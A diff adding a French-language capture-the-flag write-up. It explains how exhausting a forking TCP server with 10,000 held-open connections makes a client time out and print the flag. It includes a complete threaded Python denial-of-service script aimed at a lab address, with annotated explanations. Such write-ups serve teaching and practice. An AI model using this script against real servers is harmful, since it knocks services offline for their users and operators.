@@ -1,0 +1,96 @@
+Avant:
+Client → Serveur:31337 ✅ Connexion OK
+         Serveur fork processus
+         Attend 1024 bytes
+         Client attend 1 sec
+         Réessaie
+
+Après (ton attaque):
+Connexion 1 → Serveur fork processus 1 (bloqué)
+Connexion 2 → Serveur fork processus 2 (bloqué)
+Connexion 3 → Serveur fork processus 3 (bloqué)
+...
+Connexion 10000 → Serveur fork processus 10000 (bloqué)
+
+Serveur = SATURÉ ❌ Pas de ressources
+Client essaie de se connecter → TIMEOUT
+Client code:
+    except (TimeoutError, socket.timeout):
+        print(flag, flush=True)  ◄─── FLAG AFFICHÉ ! 🚩
+        break
+
+
+#  code python :
+python3 << 'EOF'
+import socket
+import threading
+import time
+
+sockets = []
+
+def worker():
+    for _ in range(500):
+        try:
+            s = socket.socket()
+            s.connect(("10.0.0.2", 31337))
+            sockets.append(s)
+        except:
+            pass
+
+print("[*] Saturation du serveur en cours...")
+
+for i in range(20):
+    t = threading.Thread(target=worker)
+    t.start()
+
+time.sleep(5)
+print(f"[+] {len(sockets)} connexions créées")
+print("[*] Le client va timeout dans quelques secondes...")
+print("[*] Flag devrait s'afficher maintenant !")
+
+# Garder ouvert
+while True:
+    time.sleep(1)
+EOF
+
+
+
+# documentaion :
+"The server forks a new process for each client connection"
+
+Ça veut dire :
+├─ Serveur ForkingTCPServer
+├─ Reçoit connexion 1 → Fork processus 1
+├─ Reçoit connexion 2 → Fork processus 2
+├─ Reçoit connexion 3 → Fork processus 3
+├─ ... 10,000 fois
+└─ Serveur = SATURÉ, plus de ressources
+
+s = socket.socket()           # Créer une "prise" réseau
+s.connect(("10.0.0.2", 31337))  # Se connecter au serveur
+sockets.append(s)             # Garder la connexion ouverte
+
+
+for i in range(20):
+    t = threading.Thread(target=worker)  # Créer 1 thread
+    t.start()                            # Le lancer
+
+# Résultat : 20 threads exécutent worker() en parallèle
+time.sleep(5)   # Attendre 5 secondes
+time.sleep(1)   # Attendre 1 seconde
+
+def worker():
+    for _ in range(500):              # ◄─── 500 fois par thread
+        s = socket.socket()           # ◄─── Créer socket
+        s.connect(("10.0.0.2", 31337))  # ◄─── Se connecter
+        sockets.append(s)             # ◄─── Garder ouvert
+# pourquoi ca fonctionne?:
+1 thread × 500 connexions = 500 connexions
+20 threads × 500 connexions = 10,000 connexions
+
+Chaque connexion = Serveur fork 1 processus
+10,000 connexions = 10,000 processus = SATURÉ ❌
+
+Client essaie de se connecter → Timeout
+Client code : except timeout: print(flag)
+FLAG AFFICHÉ ! 🚩
